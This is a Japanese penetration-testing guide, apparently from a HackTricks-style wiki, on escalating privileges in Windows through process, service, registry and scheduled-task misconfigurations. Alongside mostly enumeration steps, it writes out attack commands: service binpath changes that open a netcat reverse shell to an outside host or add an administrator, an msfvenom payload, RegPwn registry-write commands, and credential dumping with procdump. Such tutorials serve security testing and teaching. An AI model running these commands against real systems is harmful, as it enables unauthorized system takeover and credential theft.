**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるか確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html)を実行できる可能性を探ってください。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に実行中の[**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)がないか確認してください。これを悪用して権限昇格できる可能性があります。

debuggerのリスナーは短時間しか起動しないことがあるため、受動的なポートスナップショットで見つからなくても、過去に公開されていなかったとは限りません。確認できたリスナーについては、PID、プロセスの所有者、権限の低いユーザーから接続できるかを照合してください。アプリケーション名やdebug flagだけでは、ユーザーをまたいだコード実行が可能だとは判断できません。通常の列挙は受動的に行い、debuggerコマンドは送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリが配置されているフォルダーの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor ディレクトリ

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイルに宣言されている `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行する scheduled task や service については、該当する設定ファイルと、宣言されたモジュールディレクトリの ACL を確認してください。自分の token でそのディレクトリにファイルを作成できる場合、task や service が次にモジュールを読み込む際の code execution につながる可能性があるため、調査対象となります。実行アカウントの有効な権限、使用中の設定、モジュールとの互換性、deny や share による制限を確認してください。ディレクトリに書き込めるだけでは、privilege escalation が成立するとは限りません。[Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) では、実行時のモジュール読み込みについて説明しています。

### 書き込み可能なドキュメントルートを持つ特権 web service

Windows の Apache インストールでは、service の実行ファイルのパスと実行アカウントを、アクティブな `httpd.conf` の `DocumentRoot` と照らし合わせてください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されているドキュメントルート（多くの場合 `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されているときに、低権限ユーザーがそのルートにファイルを作成できる場合、server-side code execution によってホストの権限境界を越えられる可能性があります。service が実行中であること、正確なパスが公開されていること、対象のファイル形式が server-side handler によって処理されることを確認してください。ルートに書き込めるだけでは、ファイルを作成できることしか証明できません。probe を書き込まずに ACL を確認してください:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

従来型の WAMP インストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit 構成の場合は `C:\wamp\...`）を指し、その隣の `conf\httpd.conf` に設定ファイルがあり、既定のルートが `C:\wamp64\www` または `C:\wamp\www` になっていることがあります。正確なサービスイメージ、実行時のID、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や仮想ホストによる上書きを含む）、ルートの ACL をまとめて確認してください。WAMP ディレクトリに書き込み可能だからといって、Apache が `SYSTEM` として実行されている、または配置したファイルを実行するとは限りません。[Apache のドキュメントでは、Windows サービスが構成を選択する方法が説明されています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートとアプリケーションプールのネットワークID

IIS では、書き込み可能な物理ディレクトリが `applicationHost.config` 内の**有効なサイト／アプリケーション**に対応していることを確認し、その後、設定されているプールとサーバー側ハンドラーを特定してください。配信ディレクトリに置いたコードがプールの権限で実行されるのは、IIS がそのファイル形式を処理し、かつそのルートに到達できる場合に限られます。書き込み可能なディレクトリをコード実行と見なす前に、現在のユーザーが実効的にファイルを作成できるか、サイトが稼働中か、ハンドラーとパス単位の上書き設定がどうなっているかを確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリ内に生成されるファイルも別途確認が必要です。既定では、該当する .NET Framework のインストール先の下にある `Temporary ASP.NET Files` ディレクトリですが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft のドキュメントでは、保存場所とアプリケーションごとのサブディレクトリが説明されています](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)。また、[アプリケーションプール同士が互いを信頼しない場合は、コンパイルディレクトリを分離することが推奨されています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低い権限のトークンで**特定の**アプリケーションのキャッシュ内にある生成ソースを変更できる場合、そのアプリケーションがそれを、より高い権限を持つ[ワーカープロセスID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)で再コンパイルするかを確認してください。ファイルやディレクトリの ACL だけではコード実行の証明になりません。キャッシュが有効なアプリケーションと対応しているか、実効トークンと ACL、コンパイル設定、プロセスID、再コンパイルのタイミングを照合してください。読み取り専用でメタデータを確認し、列挙中にコンパイルを誘発したりキャッシュファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` に設定された IIS プールは、ローカルのトークンが低い権限でも、通常は**ホストコンピューターのアカウント**としてドメインリソースに認証します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。`LocalService` は通常、匿名のネットワーク資格情報を提示します。`SpecificUser` のプールは、設定されたアカウントを使用します。[Microsoft のドキュメントでは、これらのIDの種類](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[アプリケーションプールのネットワークID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)が説明されています。ID設定が省略されている場合はプールの既定値を継承することがありますが、既定値は IIS の世代によって異なるため、プール名から推測せず、実効設定を確認してください。コード実行がコンピューターアカウントのネットワークIDを持つプールに到達する場合は、**その特定のコンピューター**のディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md)にはドメインの命名コンテキストに対するレプリケーション権限が必要です。マシンアカウントのチケットやホストの役割だけでは、その権限の証明になりません。受動的な列挙では、ファイルのアップロード、ネットワーク認証、チケットの要求を行わず、設定と ACL を調べてください。

ヘルパープロセスを起動する読み取り可能な ASP.NET ハンドラーについては、リクエスト由来の値が認証、復号、検証、コマンド構築をどのように経由するかを追跡してください。デコードしたトークンを `ProcessStartInfo("cmd", "/c ...")` に連結するハンドラーは、シェルのメタ文字によってコマンドを変更される可能性があります。[Microsoft のドキュメントでは、`cmd` の特殊文字が説明されています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼できない呼び出し元が実際にデコード後の値に影響を与え、ハンドラーに到達できることを確認し、実効アプリケーションプールIDまたは偽装IDと、子プロセスのIDを特定してください。ソースコードの一行、localhost のリスナー、トークン形式の脆弱性だけでは、特権コマンド実行の証明になりません。受動的な列挙では、偽造リクエストを送信したりヘルパーを実行したりせず、ソースとプールの設定を確認してください。

Windows 上の PHP サービスでは、リクエストで制御できるパスが [`include` または `require`](https://www.php.net/manual/en/function.include.php) に渡されると、低権限ユーザーが書き込み可能な PHP ファイルがワーカーのIDで評価される可能性があります。リクエストがその処理に到達できること、解決後のパスが低権限ユーザーには変更可能でワーカーには読み取り可能なファイルを指すこと、適用される PHP のパス制限でインクルードが許可されていること、そしてワーカーが実際により高い権限で実行されていることを確認してください。ループバックリスナーや書き込み可能なファイルだけでは、この一連の条件が成立する証明になりません。受動的な列挙では、エンドポイントを呼び出さずにソース、サービスID、ファイル ACL を確認してください。

### メモリ内パスワードの探索

Sysinternals の **procdump** を使って、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは**資格情報をメモリ上に平文で保持している**ため、メモリをダンプして資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でない GUI アプリ

**SYSTEM として実行されるアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows ヘルプとサポート」（Windows + F1）で「コマンド プロンプト」を検索し、「クリックしてコマンド プロンプトを開く」をクリックします。

### 特権アプリケーションによるプロジェクトファイルのインポート

低権限ユーザーが書き込めるドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポーターのアカウントで入力の信頼境界を越えます。**正確な書き込み可能パス**、そのファイルを開くプロセスまたはタスク、実効 ID、パーサーのビルドを確認してください。[Ghidra の過去のプロジェクトを開く／復元する際の問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトメタデータ内の XML 外部エンティティが許可されていました。Windows 上でネットワークエンティティを使用すると、[アウトバウンド SMB および NTLM ポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)が許可している場合、インポートを実行するアカウントの認証情報が送信される可能性があります。これは認証情報漏えいの手掛かりであり、直ちに管理者アクセスを得られることを意味しません。応答を利用するには、別途、認可された経路または脆弱な経路が必要です。また、現在のビルドについては、実際のパッチ適用状況を確認してください。受動的な列挙中に細工したプロジェクトを開かないでください。インポートのワークフローと ACL を調べてください。

## サービス

Service Control Manager（SCM）オブジェクトの[`SC_MANAGER_CREATE_SERVICE` 権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存のサービスに対する権限とは別です。この権限を指定した読み取り専用の[`OpenSCManager` アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、それは調査の手掛かりであり、新しいサービスを実行できる証拠ではありません。[`CreateService` はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。このハンドルには、サービスの作成時に要求したサービスアクセス権が付与されます。後でサービスを再度開く場合は別途アクセスチェックが行われるため、元のハンドルを使用できても再オープンには失敗することがあります。実効ローカルまたはリモートトークン、ハンドルに付与された権限、サービスアカウント、起動ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成または起動しないでください。

リモートからサービスをインストールする経路を調べる場合は、SCM 権限と、対象上にある、**同じネットワークログオン**で書き込み可能な共有、その共有の基盤となる NTFS ACL、およびサービスアカウントが実行できるローカル実行ファイルのパスを照合してください。SCM 権限が異常に広く、ファイルを配置する経路も存在する場合、非管理者アカウントでもこの境界を越えられる可能性があります。管理共有は必須ではありません。共有への書き込み権限だけでも、SCM によるサービス作成の手掛かりだけでも、新しいサービスをより高い権限で起動できることの証明にはなりません。

既存のサービスは、`ImagePath` に指定されているヘルパー実行ファイルが存在しなくても、起動時、シャットダウン時、または他のライフサイクルイベント時にヘルパー実行ファイルを呼び出す場合があります。ヘルパー名が低権限ユーザーの書き込み可能ディレクトリから解決され、サービスがより高い権限で動作する場合、ヘルパーファイルが存在しないことは、条件付きで置き換え候補となります。**実際のサービスコードまたは文書化されたヘルパー呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリの作成権限、サービス ID、利用可能なライフサイクルトリガーを確認してください。書き込み可能なサービスディレクトリがあることや、ファイルが存在しないことだけでは、サービスがそのファイルを読み込む証拠になりません。受動的な調査では、サービスを起動または停止しないでください。

既存のサービスでは、[`SERVICE_START` により `StartService` へ引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは[`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。開始権限を単なる制御権限以上のものとして扱う前に、サービスのコードまたは文書化されたインターフェイスを確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使用する場合は、サービス ID、引数から書き込みに至る正確な処理、パスの制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーが存在する場合に限られます。書き込み可能なログや開始権限だけでは不十分です。受動的なインベントリ調査では、サービスを起動したりテストファイルを作成したりしないでください。

NSClient++ monitoring agent の場合、読み取り可能な `nsclient.ini` は**設定確認の手掛かり**です。Web 認証情報が含まれている可能性があり、`boot.ini` によって別の場所にある設定ファイルへリダイレクトされている場合もあります。実際のサービスアカウント、WEB リスナーとアクセスポリシー、認証されたロールに設定またはスクリプトを変更する権限があるかを確認してください。特権実行にはさらに、`CheckExternalScripts`（または他の有効な実行経路）、コマンドを登録または変更する実効権限、およびサービス ID で実行させるトリガーが必要です。ループバック専用のリスナーでもローカルユーザーから到達できる場合がありますが、ファイルパス、パスワード、またはリスナーの存在だけでは、これらの権限があるとは言えません。受動的な列挙中は、秘密情報を表示したり Web API を呼び出したりせずに、メタデータと権限を確認してください。[NSClient++ のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Web とスクリプトのセキュリティガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath` が `nssm.exe` のサービスでは、サービスの実際の実行アカウントと `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` の値を調べてください。[NSSM は子アプリケーションをそこに保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory` は設定された作業ディレクトリです。ラッパーの権限だけでサービス境界全体を判断する前に、子プロセスの実行ファイルとその親ディレクトリの ACL を確認してください。その子プロセスが公開するローカル WCF または SOAP エンドポイントは、別途調査すべき手掛かりです。低権限ユーザーからリスナーに到達できるか、対象の操作がユーザー入力を受け付けるか、サービスの子プロセスがより高い権限で安全でない操作を実行するかを確認してください。サービスアカウント、エンドポイント URL、または書き込み可能なパスだけでは、権限昇格の証拠になりません。受動的な列挙中にサービスの操作を呼び出さないでください。

カスタム WCF 操作では、呼び出し元が制御する文字列が PowerShell runspace に渡される経路を追跡してください。[`Pipeline.Commands.AddScript` はスクリプトテキストを追加し](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)、[`Pipeline.Invoke` はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windows transport credentials を使用する `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、**その特定の**操作を呼び出す権限と runspace の実効 ID は別途確認する必要があります。低権限の呼び出し元が入力した値が、より高いサービス ID で実行される `AddScript` に渡る経路は、コード実行の境界です。リスニングポート、認証済みクライアント、または無関係なアセンブリ内の未使用メソッドだけでは証拠になりません。列挙中にエンドポイントを呼び出さず、デプロイ済みのサービス、コントラクト、認可、偽装の設定を静的に確認してください。

Service Triggers を使うと、特定の条件（名前付きパイプ／RPC エンドポイントのアクティビティ、ETW イベント、IP の利用可能状態、デバイスの接続、GPO の更新など）が発生したときに Windows がサービスを起動できます。SERVICE_START 権限がなくても、多くの場合、トリガーを発生させることで特権サービスを起動できます。列挙と有効化の手法はこちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio 診断コレクターサービス

C/C++ tooling を含む Visual Studio のインストールには、`LocalSystem` として実行するよう設定された診断サービス `VSStandardCollectorService150` が含まれる場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、junction と object-manager-link の race を利用して、サービスの DACL リセット先をリダイレクトしました。実証された権限昇格には、さらに、利用可能な Visual Studio Setup WMI Provider の MSI repair 経路と、その対象である `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` が必要でした。このコンポーネントは 2024 年 1 月に修正されました。

受動的なトリアージでは、このサービスのアカウントとバイナリパスを確認し、Setup WMI compiler のパスが存在するかを調べ、インストール済みコンポーネントのパッチ適用状況を確認してください。サービスエントリ、Visual Studio の製品バージョン、またはコンパイラファイルだけでは、ホストに脆弱性がある証拠になりません。確認のためにサービスを起動したり、修復を実行したりする必要はありません。

サービスの一覧を取得します:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permissions

サービスの情報を取得するには **sc** を使用できます。

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことをおすすめします。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」がサービスを変更できるか確認することを推奨します。

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生した場合（たとえば SSDPSRV の場合）:

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次の方法で有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**（XP SP1では）upnphost サービスが動作するには SSDPSRV に依存する点に注意してください**

**別の回避策**として、次を実行します:

```
sc.exe config usosvc start= auto
```

### **サービスのバイナリパスを変更**

「Authenticated users」グループがサービスに対して **SERVICE_ALL_ACCESS** を持つシナリオでは、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには：

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスを再起動する

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限は、次のようなさまざまな権限を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再構成を許可します。
- **WRITE_DAC**: 権限の再構成を可能にし、サービス設定を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再構成を許可します。
- **GENERIC_WRITE**: サービス設定を変更する権限を継承します。
- **GENERIC_ALL**: サービス設定を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱な権限

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントで実行されていて、**低権限ユーザーがサービスの EXE またはその親フォルダを変更できる**場合、**バイナリを置き換えてサービスを再起動する**ことで、サービスを乗っ取れることがよくあります。

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが配置されているフォルダへの**書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**。**）\
**wmic**（system32 にはありません）を使用してサービスが実行するすべてのバイナリを取得し、**icacls** で権限を確認できます。

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

**sc** と **icacls** も使用できます。

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルやその格納ディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実際の悪用手順は次のとおりです:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリに書き込み可能か確認します。
3. サービスのバイナリを payload または有効な悪意のあるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または、再起動するかサービスのトリガーが実行されるのを待ちます）。

自動チェックに役立つツール:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスを通常のユーザー権限で再起動できない場合は、起動時に自動で開始されるか、失敗時に再起動するアクションが設定されているか、またはそのサービスを使用するアプリケーションによって間接的に起動できるかを確認してください。

### サービスレジストリの変更権限

サービスのレジストリを変更できるか確認してください。\
サービスの**レジストリ**に対する**権限**は、次の方法で**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持つか確認します。ACL エントリがあるだけでは、実効アクセスがあるとは限りません。deny エントリ、現在のトークン、継承された権限も考慮する必要があります。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` および `SERVICE_START` 権限とは別です。権限昇格には、利用可能なサービス構成フィールド、サービスを起動する手段、そしてより高い権限を持つサービス ID も必要です。Microsoft の[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)および[サービスのアクセス権のリファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリの Path を変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink raceによる任意のHKLM値書き込み（ATConfig）

一部のWindowsアクセシビリティ機能はユーザーごとの **ATConfig** キーを作成し、その後、**SYSTEM** プロセスがそれをHKLMのセッションキーにコピーします。レジストリの **symbolic link race** を利用すると、この特権による書き込みを **任意のHKLMパス** にリダイレクトでき、任意のHKLM **値を書き込む** プリミティブを得られます。<sup>[[18]](#references)</sup>

主な場所（例：スクリーンキーボード `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` はログオン時やセキュアデスクトップへの切り替え時に作成され、ユーザーが書き込み可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）：

1. SYSTEMに書き込ませたい値を **HKCU ATConfig** に設定します。
2. **LockWorkstation** などを実行してセキュアデスクトップへのコピーを起動し、AT brokerの処理を開始させます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **raceに勝ちます**。oplockが発火したら、**HKLM Session ATConfig** キーを、保護対象のHKLMパスを指す **registry link** に置き換えます。
4. SYSTEMが、リダイレクトされたHKLMパスに攻撃者が選んだ値を書き込みます。

任意のHKLM値を書き込めるようになったら、サービス設定値を上書きしてLPEに移行します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE／コマンドライン）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが起動できるサービス（例：**`msiserver`**）を選び、書き込み後に起動します。**注：** 公開されているexploitの実装では、raceの一環としてワークステーションをロックします。

ツールの例（RegPwn BOF / standalone）：<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限がある場合、**このレジストリの下にサブレジストリを作成できます**。Windows servicesの場合、**任意のコードを実行するにはこれで十分です**。

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windowsはスペースまでの各部分を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windowsは次を実行しようとします:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込み Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて列挙します:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploitでこの脆弱性を検出して悪用できます**: `exploit/windows/local/trusted\_service\_path` metasploitを使って、サービスバイナリを手動で作成することもできます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復アクション

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指定するように設定できます。このバイナリを置き換え可能な場合、privilege escalation が可能なことがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプトターゲット

`.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する有効なタスクでは、`cmd.exe` だけでなく、**action arguments** に記載されたスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を指定する場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しがそのまま記述されている場合は、参照先スクリプトの ACL も確認してください。変数、条件分岐、シェルの連結がある場合は、手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトまたは親ディレクトリが、アカウント間の実行につながるのは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションに到達する場合に限られます。スクリプトでは追記のみ可能な ACL が問題になることがありますが、先行する `exit` やその他の制御フローによって、追記した行が実行されない場合があります。privilege escalation を断定する前に、有効な ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ作成時にスクリプトを変更したり、タスクを起動したりしてはいけません。

## アクセス可能なファイルの名前付きストリーム

NTFS では、読み取り可能なファイルに名前付き `:$DATA` ストリームが含まれていても、通常のディレクトリ一覧にはその内容が表示されないことがあります。アクセス可能なバックアップや構成ファイルのうち、対象を絞った少数のファイルについて、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) と PowerShell の [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) を使って確認できます。秘密情報を示唆するストリーム名は、あくまで手掛かりにすぎません。ファイルへの実効読み取り権限、ファイルシステムがストリームをサポートしているか、ストリームに利用可能な認証情報が含まれているか、そして認証先のアカウントを確認してください。通常の列挙では、再帰的なストリームのスキャンやストリーム内容の表示は避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

